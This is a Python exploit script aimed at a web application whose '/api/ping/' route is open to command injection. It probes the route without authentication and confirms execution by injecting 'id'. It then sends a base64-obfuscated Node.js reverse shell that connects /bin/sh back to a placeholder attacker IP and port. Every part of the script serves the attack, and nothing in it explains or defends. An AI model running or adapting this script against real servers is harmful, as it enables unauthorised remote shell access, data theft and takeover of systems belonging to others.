import requests
import json
import base64


port = "RSHELL_PORT"
ip = "RSHELL_IP"
socket_code = '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(replace_port, "replace_ip", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
socket_code = socket_code.replace("replace_port", port)
socket_code = socket_code.replace("replace_ip", ip)
message_bytes = socket_code.encode('ascii')
encoded = base64.b64encode(message_bytes)
encoded = str(encoded).replace("b'","")
encoded = str(encoded).replace("'","")

socket_code = 'node -e \'eval(Buffer.from("'+encoded+'","base64").toString("ascii"))\''
print(socket_code)

def validateJSON(jsonData):
    try:
        json.loads(jsonData)
    except ValueError as err:
        return False
    return True

def step1_scan_unauth(ip):
    url = "http://"+ip+"/api/ping/8.8.8.8"
    payload = {}
    headers = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    isvalid = validateJSON(response.text)
    return isvalid

def step2_scan_rce(ip):
    url = "http://"+ip+"/api/ping/;`id`"
    payload = {}
    headers = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    if response.text.find("uid") > 0:
        return True

def step3(ip):
    url = "http://"+ip+"/api/ping/;"+socket_code
    payload = {}
    headers = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    print(response.text)
    


ip_list = [
    "127.0.0.1:3000",
]

for i in ip_list:
    if step1_scan_unauth(i) == True:
        if step2_scan_rce(i) == True:
            step3(i)
    
    
    

